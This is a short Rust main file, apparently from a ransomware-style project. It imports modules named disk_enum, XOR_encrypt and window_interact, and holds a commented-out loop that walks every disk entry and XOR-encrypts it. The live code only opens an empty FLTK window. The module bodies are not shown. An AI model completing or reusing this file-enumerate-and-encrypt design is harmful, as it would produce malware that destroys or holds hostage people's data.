extern crate winapi;
mod XOR_encrypt;
mod disk_enum;
mod window_interact;
use disk_enum::disk_enum;
use XOR_encrypt::XOR_encrypt;
use window_interact::window_interact;
extern crate gtk;
use gtk::prelude::*;
use gtk::{ButtonsType, DialogFlags, MessageDialog, MessageType, Window, WindowType};
use fltk::{app, window};

fn main() {
    unsafe {
        /*
        for entry in disk_enum() {
            XOR_encrypt(&entry);
        }*/
        let app = app::App::default();
    let mut wind = window::Window::new(100, 100, 400, 300, "Fenêtre FLTK");

    wind.end();
    wind.show();

    app.run().unwrap();
    }
}
